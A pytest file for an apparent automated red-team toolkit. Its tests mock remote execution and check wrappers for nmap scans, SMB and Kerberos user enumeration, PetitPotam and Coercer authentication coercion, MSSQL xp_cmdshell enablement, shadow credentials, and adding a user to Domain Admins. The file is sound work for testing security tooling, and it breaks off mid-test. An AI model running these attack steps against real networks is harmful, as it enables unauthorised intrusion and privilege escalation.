"""Tests for red team network penetration testing tools."""

from unittest.mock import patch

import pytest

from ares.core.models import (
    SharedRedTeamState,
    Target,
)


class MockRunResult:
    """Mock result for run_remote function."""

    def __init__(self, stdout: str = "", stderr: str = "", return_code: int = 0):
        self.stdout = stdout
        self.stderr = stderr
        self.return_code = return_code


@pytest.fixture
def red_team_state() -> SharedRedTeamState:
    """Create a basic red team state for testing."""
    state = SharedRedTeamState(operation_id="op-test-001")
    state.target = Target(ip="192.168.58.100", hostname="dc01", domain="contoso.local")
    return state


class TestRunToolFunction:
    """Tests for run_tool helper function."""

    def test_run_tool_success(self):
        """Test successful command execution."""
        from ares.tools.red.common import run_tool

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="output", stderr="", return_code=0)
            stdout, stderr, code = run_tool(["echo", "test"])

        assert stdout == "output"
        assert stderr == ""
        assert code == 0

    def test_run_tool_failure(self):
        """Test failed command execution."""
        from ares.tools.red.common import run_tool

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="", stderr="error", return_code=1)
            _stdout, stderr, code = run_tool(["invalid", "command"])

        assert stderr == "error"
        assert code == 1

    def test_run_tool_passes_target_role(self):
        """Test target_role forwarding to remote executor."""
        from ares.tools.red.common import run_tool

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="ok", stderr="", return_code=0)
            run_tool(["whoami"], target_role="lateral")

        # The tool path may be resolved to a full path (e.g., /usr/bin/whoami)
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        assert call_args.kwargs.get("target_role") == "lateral"
        assert call_args.kwargs.get("timeout_seconds") == 300
        # The command should end with "whoami" (may have full path prefix)
        called_cmd = call_args.args[0] if call_args.args else call_args.kwargs.get("cmd", [])
        assert called_cmd[0].endswith("whoami")


class TestNetworkEnumerationTools:
    """Tests for NetworkEnumerationTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_credential_tool_adds_user_with_shared_state(self):
        """Ensure credentials add users when using SharedRedTeamState."""
        from ares.core.models import SharedRedTeamState
        from ares.tools.red import CredentialDiscoveryTools

        state = SharedRedTeamState(operation_id="op-test-cred-user-sync")
        tools = CredentialDiscoveryTools()
        tools.set_state(state)

        tools._add_credential(
            username="alans",
            password="alans",  # pragma: allowlist secret
            domain="contoso.local",
            source="username_as_password",
        )
        tools._add_credential(
            username="alans",
            password="alans",  # pragma: allowlist secret
            domain="contoso.local",
            source="username_as_password",
        )

        assert len(state.all_credentials) == 1
        users = {(user.username, user.domain) for user in state.all_users}
        assert ("alans", "contoso.local") in users

    def test_nmap_scan_drops_aws_ptr_hostname_and_keeps_os(self):
        """Ensure AWS PTR hostnames are not stored while OS details are kept.

        Note: AWS PTR hostname filtering only works with SharedRedTeamState
        which has the add_host method with filtering logic.
        """
        from ares.core.models import SharedRedTeamState
        from ares.tools.red import NetworkEnumerationTools

        state = SharedRedTeamState(operation_id="op-test-aws-ptr")
        tools = NetworkEnumerationTools()
        tools.set_state(state)

        port_stdout = (
            "Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 17:43 +0000\n"
            "Nmap scan report for ip-192-168-58-10.us-west-2.compute.internal (192.168.58.10)\n"
            "Host is up.\n\n"
            "PORT    STATE    SERVICE\n"
            "445/tcp open     microsoft-ds\n\n"
            "Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds\n"
        )
        svc_stdout = (
            "Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 17:44 +0000\n"
            "Nmap scan report for ip-192-168-58-10.us-west-2.compute.internal (192.168.58.10)\n"
            "Host is up.\n\n"
            "PORT    STATE    SERVICE\n"
            "445/tcp open     microsoft-ds\n"
            "Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n"
            "Nmap done: 1 IP address (1 host up) scanned in 4.21 seconds\n"
        )

        with patch("ares.tools.red.reconnaissance.run_tool") as mock_run:
            mock_run.side_effect = [
                (port_stdout, "", 0),
                (svc_stdout, "", 0),
            ]
            tools.nmap_scan("192.168.58.10")

        host = next(h for h in state.all_hosts if h.ip == "192.168.58.10")
        assert "compute.internal" not in (host.hostname or "").lower()
        assert host.os.lower().startswith("windows")

    def test_extract_users_from_netexec_users_backslash_format(self):
        """Test parsing netexec --users output with backslash usernames."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        outputs = [
            (
                "netexec smb --users",
                "SMB 192.168.58.1 445 DC [*] CONTOSO\\alans (SidTypeUser)\n",
            )
        ]

        users = tools._extract_users_from_outputs(outputs)

        assert "alans" in users

    def test_extract_users_from_netexec_rid_brute_backslash_format(self):
        """Test parsing netexec --rid-brute output with backslash usernames."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        outputs = [
            (
                "netexec smb --rid-brute",
                "SMB 192.168.58.1 445 DC CONTOSO\\svc-sql (SidTypeUser)\n",
            )
        ]

        users = tools._extract_users_from_outputs(outputs)

        assert "svc-sql" in users

    def test_nmap_scan_success(self, red_team_state: SharedRedTeamState):
        """Test successful nmap scan."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="PORT   STATE SERVICE\n22/tcp open  ssh\n",
                stderr="",
                return_code=0,
            )
            result = tools.nmap_scan("192.168.58.100")

        assert "PORT" in result
        assert "22/tcp" in result
        assert "192.168.58.100" in red_team_state.queried_hosts

    def test_nmap_scan_failure(self, red_team_state: SharedRedTeamState):
        """Test nmap scan failure."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="", stderr="Host unreachable", return_code=1
            )
            result = tools.nmap_scan("192.168.58.100")

        assert "unreachable" in result.lower() or "failed" in result.lower()

    def test_nmap_scan_exception(self, red_team_state: SharedRedTeamState):
        """Test nmap scan handles exceptions."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection error")
            result = tools.nmap_scan("192.168.58.100")

        assert "failed" in result.lower()

    def test_nmap_scan_multiple_targets(self, red_team_state: SharedRedTeamState):
        """Test nmap scan with multiple targets."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Scan complete", return_code=0)
            tools.nmap_scan("192.168.58.100 192.168.58.101")

        # Both hosts should be tracked
        assert "192.168.58.100" in red_team_state.queried_hosts
        assert "192.168.58.101" in red_team_state.queried_hosts

    def test_nmap_scan_deduplication_skips_scanned_targets(
        self, red_team_state: SharedRedTeamState
    ):
        """Test that nmap_scan skips targets already in scanned_targets."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        # Pre-populate scanned_targets
        red_team_state.scanned_targets.add("192.168.58.100")

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Scan complete", return_code=0)
            result = tools.nmap_scan("192.168.58.100")

        # Should skip without calling nmap
        mock_run.assert_not_called()
        assert "already scanned" in result.lower()

    def test_nmap_scan_deduplication_partial_skip(self, red_team_state: SharedRedTeamState):
        """Test that nmap_scan only scans new targets when some are already scanned."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        # Pre-populate one target as scanned
        red_team_state.scanned_targets.add("192.168.58.100")

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="PORT   STATE SERVICE\n22/tcp open  ssh\n",
                stderr="",
                return_code=0,
            )
            tools.nmap_scan("192.168.58.100 192.168.58.101")

        # Should only scan the new target (192.168.58.101)
        # Check that run_remote was called with command containing only 192.168.58.101
        assert mock_run.called
        call_args = str(mock_run.call_args)
        assert "192.168.58.101" in call_args
        # The already-scanned target should not be in the command
        # (though it might appear in logs, the scan itself should exclude it)

    def test_nmap_scan_marks_targets_as_scanned(self, red_team_state: SharedRedTeamState):
        """Test that successful nmap scan adds targets to scanned_targets."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        assert "192.168.58.100" not in red_team_state.scanned_targets

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="PORT   STATE SERVICE\n22/tcp open  ssh\n",
                stderr="",
                return_code=0,
            )
            tools.nmap_scan("192.168.58.100")

        # After scan, target should be in scanned_targets
        assert "192.168.58.100" in red_team_state.scanned_targets

    def test_enumerate_users_success(self, red_team_state: SharedRedTeamState):
        """Test successful user enumeration."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Administrator\nuser1\nuser2", return_code=0
            )
            result = tools.enumerate_users(
                target="192.168.58.100",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Administrator" in result

    def test_enumerate_users_null_session(self, red_team_state: SharedRedTeamState):
        """Test user enumeration with null session using realistic output."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        netexec_users = (
            "SMB                      192.168.58.9        445    HQ-DC            "
            "[*] Windows 10 / Server 2019 Build 17763 x64 (name:HQ-DC) "
            "(domain:marketing.bigco.com) (signing:True) (SMBv1:None) (Null Auth:True)\n"
        )
        lsaquery_output = (
            "Domain Name: MARKETING\nDomain Sid: S-1-5-21-1111111111-2222222222-3333333333\n"
        )
        access_denied = "result was NT_STATUS_ACCESS_DENIED\n"
        nmap_445 = (
            "Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 17:43 +0000\n"
            "Nmap scan report for ip-10-0-9-9.us-west-2.compute.internal (192.168.58.9)\n"
            "Host is up.\n\n"
            "PORT    STATE    SERVICE\n"
            "445/tcp filtered microsoft-ds\n\n"
            "Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds\n"
        )
        rid_brute = (
            "SMB                      192.168.58.9        445    HQ-DC            "
            "[*] Windows 10 / Server 2019 Build 17763 x64 (name:HQ-DC) "
            "(domain:marketing.bigco.com) (signing:True) (SMBv1:None) (Null Auth:True)\n"
            "SMB                      192.168.58.9        445    HQ-DC            "
            "[+] marketing.bigco.com\\:\n"
            "SMB                      192.168.58.9        445    HQ-DC            "
            "[-] Error connecting: LSAD SessionError: code: 0xc0000022 - "
            "STATUS_ACCESS_DENIED - {Access Denied} A process has requested access "
            "to an object but has not been granted those access rights.\n"
        )
        kerb_noauth = (
            "Impacket v0.13.0.dev0+20251022.125034.d843881f - Copyright Fortra, LLC "
            "and its affiliated companies\n\n"
            "[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
        )

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = [
                MockRunResult(stdout=netexec_users, return_code=0),
                MockRunResult(stdout=lsaquery_output, return_code=0),
                MockRunResult(stdout=access_denied, return_code=1),
                MockRunResult(stdout=access_denied, return_code=1),
                MockRunResult(stdout=access_denied, return_code=1),
                MockRunResult(stdout=nmap_445, return_code=0),
                MockRunResult(stdout=nmap_445, return_code=0),
                MockRunResult(stdout=rid_brute, return_code=0),
                MockRunResult(stdout=kerb_noauth, return_code=0),
            ]
            result = tools.enumerate_users(target="192.168.58.100", username="", password="")

        assert "SMB user enumeration did not return users" in result
        assert "445 filtered" in result
        assert "access denied" in result.lower()
        assert mock_run.call_count >= 8  # Implementation may vary in number of calls


class TestCertipyTools:
    """Tests for CertipyTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import CertipyTools

        tools = CertipyTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import CertipyTools

        tools = CertipyTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_certipy_find_rejects_placeholder(self, red_team_state: SharedRedTeamState):
        """Test certipy_find rejects placeholder passwords."""
        from ares.tools.red import CertipyTools

        tools = CertipyTools()
        tools.set_state(red_team_state)

        result = tools.certipy_find(
            domain="contoso.local",
            username="user",
            password="password",  # pragma: allowlist secret
            dc_ip="192.168.58.10",
        )

        assert "placeholder" in result.lower()

    def test_enumerate_users_exception(self, red_team_state: SharedRedTeamState):
        """Test user enumeration handles exceptions."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Auth failed")
            result = tools.enumerate_users(
                target="192.168.58.100",
                username="user",
                password="wrong",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_enumerate_shares_success(self, red_team_state: SharedRedTeamState):
        """Test successful share enumeration."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="ADMIN$ READ,WRITE\nC$ READ\nSHARE1 READ", return_code=0
            )
            result = tools.enumerate_shares(
                target="192.168.58.100",
                domain="TEST",
                username="admin",
                password="pass",  # pragma: allowlist secret
            )

        assert "ADMIN$" in result or "SHARE1" in result

    def test_enumerate_shares_exception(self, red_team_state: SharedRedTeamState):
        """Test share enumeration handles exceptions."""
        from ares.tools.red import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.enumerate_shares(
                target="192.168.58.100",
                username="user",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestCredentialHarvestingTools:
    """Tests for CredentialHarvestingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_kerberos_user_enum_noauth(self, red_team_state: SharedRedTeamState):
        """Test Kerberos no-auth user enumeration using realistic output."""
        from ares.core.models import User
        from ares.tools.red import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        # Pre-populate state with users for the tool to validate
        red_team_state.users.append(User(username="admin"))
        red_team_state.users.append(User(username="jane.doe"))
        red_team_state.users.append(User(username="bob.smith"))

        getnpusers_output = (
            "Impacket v0.13.0.dev0+20251022.125034.d843881f - Copyright Fortra, LLC "
            "and its affiliated companies\n\n"
            "[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
            "[-] User jane.doe doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
            "[-] User bob.smith doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
        )

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout=getnpusers_output, return_code=0)
            result = tools.kerberos_user_enum_noauth(
                domain="marketing.bigco.com",
                dc_ip="192.168.58.9",
                users_file="",
            )

        assert "✓ Valid principals" in result
        assert "admin" in result
        assert "jane.doe" in result
        assert "bob.smith" in result

    def test_check_smb_connectivity_success(self, red_team_state: SharedRedTeamState):
        """Test SMB connectivity check success."""
        from ares.tools.red import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="open", return_code=0)
            success, _msg = tools._check_smb_connectivity("192.168.58.100")

        assert success is True

    def test_check_smb_connectivity_failure(self, red_team_state: SharedRedTeamState):
        """Test SMB connectivity check failure."""
        from ares.tools.red import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="closed", return_code=1)
            success, _msg = tools._check_smb_connectivity("192.168.58.100")

        assert success is False


class TestCrackingTools:
    """Tests for CrackingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import CrackingTools

        tools = CrackingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import CrackingTools

        tools = CrackingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestSharePilferingTools:
    """Tests for SharePilferingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import SharePilferingTools

        tools = SharePilferingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import SharePilferingTools

        tools = SharePilferingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestGoldenTicketTools:
    """Tests for GoldenTicketTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import GoldenTicketTools

        tools = GoldenTicketTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import GoldenTicketTools

        tools = GoldenTicketTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestBloodHoundTools:
    """Tests for BloodHoundTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import BloodHoundTools

        tools = BloodHoundTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import BloodHoundTools

        tools = BloodHoundTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestDelegationTools:
    """Tests for DelegationTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import DelegationTools

        tools = DelegationTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import DelegationTools

        tools = DelegationTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_parse_delegation_with_spn_exists_column(self, red_team_state: SharedRedTeamState):
        """Test parsing findDelegation output with SPN Exists column.

        Impacket's findDelegation.py may include a 5th column "SPN Exists" (Yes/No/-)
        which must be stripped before parsing the target SPN.
        """
        from ares.tools.red import DelegationTools

        tools = DelegationTools()
        tools.set_state(red_team_state)

        # Sample output with SPN Exists column (Yes/No/-)
        output = """Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

AccountName      AccountType  DelegationType                      DelegationRightsTo                SPN Exists
---------------  -----------  ----------------------------------  --------------------------------  ----------
web_svc$         Computer     Constrained                         cifs/dc01.contoso.local           Yes
mssql_svc        User         Constrained w/ Protocol Transition  MSSQLSvc/sql01.contoso.local      No
app_svc          User         Unconstrained                       N/A                               -

[*] Total entries: 3
"""
        delegations = tools._parse_delegation_output(output)

        assert len(delegations) == 3

        # First delegation (constrained, computer account)
        assert delegations[0]["account"] == "web_svc$"
        assert delegations[0]["account_type"] == "computer"
        assert delegations[0]["delegation_type"] == "constrained"
        assert delegations[0]["target_spn"] == "cifs/dc01.contoso.local"

        # Second delegation (constrained with protocol transition)
        assert delegations[1]["account"] == "mssql_svc"
        assert delegations[1]["account_type"] == "user"
        assert delegations[1]["delegation_type"] == "constrained"
        assert delegations[1]["target_spn"] == "MSSQLSvc/sql01.contoso.local"

        # Third delegation (unconstrained)
        assert delegations[2]["account"] == "app_svc"
        assert delegations[2]["delegation_type"] == "unconstrained"
        assert delegations[2]["target_spn"] == "N/A"

    def test_parse_delegation_without_spn_exists_column(self, red_team_state: SharedRedTeamState):
        """Test parsing findDelegation output without SPN Exists column.

        Older versions or different configurations may omit the SPN Exists column.
        """
        from ares.tools.red import DelegationTools

        tools = DelegationTools()
        tools.set_state(red_team_state)

        # Sample output without SPN Exists column
        output = """Impacket v0.11.0 - Copyright Fortra, LLC

AccountName      AccountType  DelegationType       DelegationRightsTo
---------------  -----------  -------------------  ---------------------------
svc_account$     Computer     Constrained          cifs/dc01.contoso.local
"""
        delegations = tools._parse_delegation_output(output)

        assert len(delegations) == 1
        assert delegations[0]["account"] == "svc_account$"
        assert delegations[0]["delegation_type"] == "constrained"
        assert delegations[0]["target_spn"] == "cifs/dc01.contoso.local"


class TestRedTeamReportingTools:
    """Tests for RedTeamReportingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import RedTeamReportingTools

        tools = RedTeamReportingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import RedTeamReportingTools

        tools = RedTeamReportingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_record_weakness_basic(self, red_team_state: SharedRedTeamState):
        """Test record_weakness records a finding."""
        from ares.tools.red import RedTeamReportingTools

        tools = RedTeamReportingTools()
        tools.set_state(red_team_state)

        result = tools.record_weakness(
            title="Weak Password Policy",
            vulnerability="Password length requirement is only 7 characters",
            affected_resource="Domain-wide",
        )

        assert "[+] Recorded weakness: Weak Password Policy" in result
        assert len(red_team_state.weaknesses) == 1


class TestCoercionTools:
    """Tests for CoercionTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_petitpotam_unauthenticated(self, red_team_state: SharedRedTeamState):
        """Test PetitPotam unauthenticated coercion."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Successfully coerced authentication", return_code=0
            )
            result = tools.petitpotam("192.168.58.10", "192.168.58.100")

        assert "success" in result.lower()
        mock_run.assert_called_once()

    def test_petitpotam_authenticated(self, red_team_state: SharedRedTeamState):
        """Test PetitPotam authenticated coercion."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Successfully coerced", return_code=0)
            result = tools.petitpotam(
                "192.168.58.10",
                "192.168.58.100",
                username="user",
                password="pass",  # pragma: allowlist secret
                domain="contoso.local",
            )

        assert "success" in result.lower()

    def test_petitpotam_failure(self, red_team_state: SharedRedTeamState):
        """Test PetitPotam failure handling."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.petitpotam("192.168.58.10", "192.168.58.100")

        assert "failed" in result.lower()

    def test_coercer_success(self, red_team_state: SharedRedTeamState):
        """Test Coercer tool success."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Triggered authentication via MS-EFSRPC", return_code=0
            )
            result = tools.coercer(
                "192.168.58.10",
                "192.168.58.100",
                "user",
                "pass",  # pragma: allowlist secret
                "contoso.local",
            )

        assert "triggered" in result.lower()

    def test_coercer_exception(self, red_team_state: SharedRedTeamState):
        """Test Coercer exception handling."""
        from ares.tools.red import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Timeout")
            result = tools.coercer(
                "192.168.58.10",
                "192.168.58.100",
                "user",
                "pass",  # pragma: allowlist secret
                "contoso.local",
            )

        assert "failed" in result.lower()


class TestMSSQLTools:
    """Tests for MSSQLTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import MSSQLTools

        tools = MSSQLTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_mssql_command_success(self, red_team_state: SharedRedTeamState):
        """Test MSSQL command execution success."""
        from ares.tools.red import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = ("nt authority\\system", "", 0)
            result = tools.mssql_command(
                "192.168.58.22",
                "user",
                "pass",  # pragma: allowlist secret
                "whoami",
                domain="contoso.local",
            )

        assert "system" in result.lower()

    def test_mssql_command_exception(self, red_team_state: SharedRedTeamState):
        """Test MSSQL command exception handling."""
        from ares.tools.red import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.mssql_command(
                "192.168.58.22",
                "user",
                "pass",  # pragma: allowlist secret
                "whoami",
            )

        assert "failed" in result.lower()

    def test_mssql_enable_xp_cmdshell_success(self, red_team_state: SharedRedTeamState):
        """Test xp_cmdshell enablement."""
        from ares.tools.red import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.return_value = ("configuration option 'xp_cmdshell' changed", "", 0)
            result = tools.mssql_enable_xp_cmdshell(
                "192.168.58.22",
                "user",
                "pass",  # pragma: allowlist secret
                domain="contoso.local",
            )

        assert "enabled" in result.lower() or "changed" in result.lower()

    def test_mssql_enable_xp_cmdshell_exception(self, red_team_state: SharedRedTeamState):
        """Test xp_cmdshell enablement exception handling."""
        from ares.tools.red import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.lateral_movement.run_tool") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.mssql_enable_xp_cmdshell(
                "192.168.58.22",
                "user",
                "pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestACLExploitTools:
    """Tests for ACLExploitTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_pywhisker_add_success(self, red_team_state: SharedRedTeamState):
        """Test pywhisker shadow credentials success."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Shadow credentials saved to admin.pfx", return_code=0
            )
            result = tools.pywhisker(
                "Administrator",
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
            )

        assert ".pfx" in result.lower() or "shadow" in result.lower()

    def test_pywhisker_exception(self, red_team_state: SharedRedTeamState):
        """Test pywhisker exception handling."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.pywhisker(
                "Administrator",
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
            )

        assert "failed" in result.lower()

    def test_bloodyad_add_group_member_success(self, red_team_state: SharedRedTeamState):
        """Test bloodyAD group member addition."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Successfully added user to Domain Admins", return_code=0
            )
            result = tools.bloodyad_add_group_member(
                "controlled_user",
                "Domain Admins",
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
            )

        assert "added" in result.lower() or "success" in result.lower()

    def test_bloodyad_add_group_member_exception(self, red_team_state: SharedRedTeamState):
        """Test bloodyAD group member exception handling."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Insufficient rights")
            result = tools.bloodyad_add_group_member(
                "user",
                "Domain Admins",
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
            )

        assert "failed" in result.lower()

    def test_bloodyad_set_password_success(self, red_team_state: SharedRedTeamState):
        """Test bloodyAD password reset."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Password changed successfully", return_code=0
            )
            result = tools.bloodyad_set_password(
                "target_user",
                "NewP@ss123!",  # pragma: allowlist secret
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
            )

        assert "reset" in result.lower() or "changed" in result.lower()

    def test_bloodyad_set_password_exception(self, red_team_state: SharedRedTeamState):
        """Test bloodyAD password reset exception handling."""
        from ares.tools.red import ACLExploitTools

        tools = ACLExploitTools()
